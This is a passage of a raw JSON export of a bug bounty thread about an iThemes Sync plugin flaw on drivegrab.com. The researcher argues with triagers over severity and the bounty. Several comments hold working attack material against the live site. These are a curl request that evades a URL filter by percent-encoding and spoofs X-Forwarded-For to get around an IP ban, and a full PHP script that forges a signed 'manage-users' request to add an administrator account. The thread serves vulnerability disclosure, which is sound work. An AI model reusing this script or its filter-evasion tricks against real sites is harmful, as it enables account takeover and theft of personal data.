vulnerabilities.\u003c/p\u003e\n\n\u003cp\u003eIt can\u0026#39;t be a matter of opinion whether the vulnerability exists or not. If it \u0026quot;is not working\u0026quot;, maybe you could tell me how it is not working. Do you get an error message, or what happens?\u003c/p\u003e\n\n\u003cp\u003eI can contact iThemes and ask them to confirm that their Sync plugin can be controlled with the plaintext key. If you give me the key and user id, I can try to reproduce it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-13T06:39:13.359Z","updated_at":"2017-10-13T06:39:13.359Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2071287,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jouko,\n\nThanks again for your efforts, that was a great find!\nAfter long discussions internally, and based on CVSS V3 and also our business logic, we have made sure that the risk score here is **High** due to multiple factors including but not limited to: the affected domain, the hardening measures in place, the password policy and the SQL server hardening.\nThat defense in depth techniques would maintain the impacted scope, integrity and availability impact which will lower the risk to **High**.\nThanks and we look forward to working with you on future reports.\n\nKeep hunting!\n@dukefleed ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks again for your efforts, that was a great find!\u003cbr\u003e\nAfter long discussions internally, and based on CVSS V3 and also our business logic, we have made sure that the risk score here is \u003cstrong\u003eHigh\u003c/strong\u003e due to multiple factors including but not limited to: the affected domain, the hardening measures in place, the password policy and the SQL server hardening.\u003cbr\u003e\nThat defense in depth techniques would maintain the impacted scope, integrity and availability impact which will lower the risk to \u003cstrong\u003eHigh\u003c/strong\u003e.\u003cbr\u003e\nThanks and we look forward to working with you on future reports.\u003c/p\u003e\n\n\u003cp\u003eKeep hunting!\u003cbr\u003e\n\u003ca href=\"/dukefleed\"\u003e@dukefleed\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-17T00:20:26.416Z","updated_at":"2017-10-17T00:20:26.416Z","actor":{"username":"dukefleed","cleared":false,"url":"/dukefleed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/179/358/4957a9bf08fe3fed492a5def8b2afd61e032c96f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2071661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"With the so called hardening you probably refer to the server returning a 403 error if the URL contains \"ithemes-sync-request\". I'm not sure if this was put in place before or after this report, but in any case it can be bypassed by encoding the parameter:\n\n~~~~\ncurl -s -i 'https://www.drivegrab.com/?ithemes-sync-reques%74=1' --data 'request={\"action\":\"manage-users\",\"arguments\":{},\"user_id\":\"123\",\"salt\":\"A\",\"hash\":\"B\"}' -H 'X-Forwarded-For: 123.1.2.3'\n~~~~\nThe X-Forwarded-For is there because for some reason my normal IP was banned from accessing the site.\n\nResponse:\n~~~~\n██████████\n\n{\"errors\":{\"user-not-authenticated\":\"The requested user is not authenticated.\"},\"verb_time\":false}\n~~~~\nThis response is generated in request-handler.php, just before the hash check I described above, just as expected. Code:\n~~~~php\n                if ( ! isset( $this-\u003eoptions['authentications'][$request['user_id']] ) ) {\n                        $this-\u003esend_response( new WP_Error( 'user-not-authenticated', 'The requested user is not authenticated.' ) );\n                }\n                \n                $user_data = $this-\u003eoptions['authentications'][$request['user_id']];\n                \n                $hash = hash( 'sha256', $request['user_id'] . $request['action'] . $this-\u003ejson_encode( $request['arguments'] ) . $user_data['key'] . $request['salt'] );\n\n~~~~\nWith a correct user_id and key the check is passed and the user management function executed. This is a remote code execution. You can't just say \"it is not working\" or \"hardened\" or \"not totally similar\". The system obviously executes the vulnerable code. It's working perfectly up to the point where the user id and plaintext key is needed.  Banning specific URLs or IP's is just security by obscurity and has no bearing on the vulnerability itself.\n","markdown_message":"\u003cp\u003eWith the so called hardening you probably refer to the server returning a 403 error if the URL contains \u0026quot;ithemes-sync-request\u0026quot;. I\u0026#39;m not sure if this was put in place before or after this report, but in any case it can be bypassed by encoding the parameter:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -s -i \u0026#39;https://www.drivegrab.com/?ithemes-sync-reques%74=1\u0026#39; --data \u0026#39;request={\u0026quot;action\u0026quot;:\u0026quot;manage-users\u0026quot;,\u0026quot;arguments\u0026quot;:{},\u0026quot;user_id\u0026quot;:\u0026quot;123\u0026quot;,\u0026quot;salt\u0026quot;:\u0026quot;A\u0026quot;,\u0026quot;hash\u0026quot;:\u0026quot;B\u0026quot;}\u0026#39; -H \u0026#39;X-Forwarded-For: 123.1.2.3\u0026#39;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe X-Forwarded-For is there because for some reason my normal IP was banned from accessing the site.\u003c/p\u003e\n\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e██████████\n\n{\u0026quot;errors\u0026quot;:{\u0026quot;user-not-authenticated\u0026quot;:\u0026quot;The requested user is not authenticated.\u0026quot;},\u0026quot;verb_time\u0026quot;:false}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis response is generated in request-handler.php, just before the hash check I described above, just as expected. Code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e \u003cspan class=\"nb\"\u003eisset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;authentications\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]]\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003esend_response\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eWP_Error\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;user-not-authenticated\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;The requested user is not authenticated.\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n                \u003cspan class=\"nv\"\u003e$user_data\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;authentications\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]];\u003c/span\u003e\n\n                \u003cspan class=\"nv\"\u003e$hash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;sha256\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;action\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$this\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"na\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;arguments\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$user_data\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;key\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"nv\"\u003e$request\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;salt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWith a correct user_id and key the check is passed and the user management function executed. This is a remote code execution. You can\u0026#39;t just say \u0026quot;it is not working\u0026quot; or \u0026quot;hardened\u0026quot; or \u0026quot;not totally similar\u0026quot;. The system obviously executes the vulnerable code. It\u0026#39;s working perfectly up to the point where the user id and plaintext key is needed.  Banning specific URLs or IP\u0026#39;s is just security by obscurity and has no bearing on the vulnerability itself.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-17T04:38:05.380Z","updated_at":"2017-11-17T06:08:43.435Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2075660,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's an updated script with additional tricks to bypass the IP and URL bans.\n\n~~~~php\n\u003c?php\n\n// fill in these two\n$user_id='123';\n$key='(KEY HERE)';\n\n$action='manage-users';\n\n$newuser=array();\n$newuser[0]=array();\n$newuser[0][0]=array();\n$newuser[0][0]['user_login']='newuser';\n$newuser[0][0]['user_pass']='newpass';\n$newuser[0][0]['██████████']='foo@foo.com';\n$newuser[0][0]['role']='administrator';\n\n$args=array();\n$args['add']=$newuser;\n\n$salt='A';\n\n$hash=hash('sha256',$user_id.$action.json_encode($args).$key.$salt);\n\n$req=array();\n$req['action']=$action;\n$req['arguments']=$args;\n$req['user_id']=$user_id;\n$req['salt']=$salt;\n$req['hash']=$hash;\n\n$data='request='.json_encode($req);\necho(\"sending: $data\\n\");\n\n$c=curl_init();\ncurl_setopt($c, CURLOPT_URL,'https://www.drivegrab.com/?ithemes-sync-reques%74=1');\ncurl_setopt($c, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla','X-Forwarded-For: 123.1.2.3'));\ncurl_setopt($c, CURLOPT_POSTFIELDS, $data);\n$res=curl_exec($c);\n\necho(\"response: \".json_encode($res).\"\\n\");\n?\u003e\n~~~~\n","markdown_message":"\u003cp\u003eHere\u0026#39;s an updated script with additional tricks to bypass the IP and URL bans.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e// fill in these two\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$user_id\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;123\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;(KEY HERE)\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$action\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;manage-users\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_login\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;newuser\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_pass\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;newpass\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;██████████\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;foo@foo.com\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;role\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;administrator\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;add\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$newuser\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$salt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;A\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$hash\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003ehash\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;sha256\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nv\"\u003e$user_id\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$action\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$key\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$salt\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;action\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$action\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;arguments\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$args\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;user_id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$user_id\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;salt\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$salt\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hash\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$hash\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;request=\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$req\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;sending: \u003c/span\u003e\u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003ecurl_init\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ecurl_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCURLOPT_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;https://www.drivegrab.com/?ithemes-sync-reques%74=1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ecurl_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCURLOPT_HTTPHEADER\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;User-Agent: Mozilla\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;X-Forwarded-For: 123.1.2.3\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ecurl_setopt\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eCURLOPT_POSTFIELDS\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$data\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nb\"\u003ecurl_exec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003eecho\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;response: \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nb\"\u003ejson_encode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$res\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2017-10-18T03:09:29.183Z","updated_at":"2017-11-15T07:08:17.815Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2082596,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @jouko\n\nThank you again for your additional information regarding the impact of your finding. \n\nWe would like to inform you that according to Hackerone's team point of view and our investigation we consider that your bounty is appropriate to your finding. As a reminder this domain is out-of-scope which means normally not eligible for any bounty. Nevertheless because of your high impact finding, your great report and for the time spent we decided to reward you 4500$.\n\nAlso noted that to avoid any confusion in a future please provide all the evidences for each vulnerabilities found in your first report. \n\nThank you for working with us. We are looking forward to see more of your bug reports.","markdown_message":"\u003cp\u003eHello \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you again for your additional information regarding the impact of your finding. \u003c/p\u003e\n\n\u003cp\u003eWe would like to inform you that according to Hackerone\u0026#39;s team point of view and our investigation we consider that your bounty is appropriate to your finding. As a reminder this domain is out-of-scope which means normally not eligible for any bounty. Nevertheless because of your high impact finding, your great report and for the time spent we decided to reward you 4500$.\u003c/p\u003e\n\n\u003cp\u003eAlso noted that to avoid any confusion in a future please provide all the evidences for each vulnerabilities found in your first report. \u003c/p\u003e\n\n\u003cp\u003eThank you for working with us. We are looking forward to see more of your bug reports.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-19T03:00:08.899Z","updated_at":"2017-10-19T03:00:08.899Z","actor":{"username":"nozz_","cleared":false,"url":"/nozz_","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/Pav4PNZrRD6jcjSGBPe7jAW5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2082741,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Your policy page says not only that drivegrab.com is in scope and \"critical\", i.e. one of the most important targets. Did I misunderstand? Also from the policy page one could understand that disclosure of personal information (licence numbers explicitly mentioned) would be a critical issue. This bug gave the attacker access to this information (drivers' personal information including licence 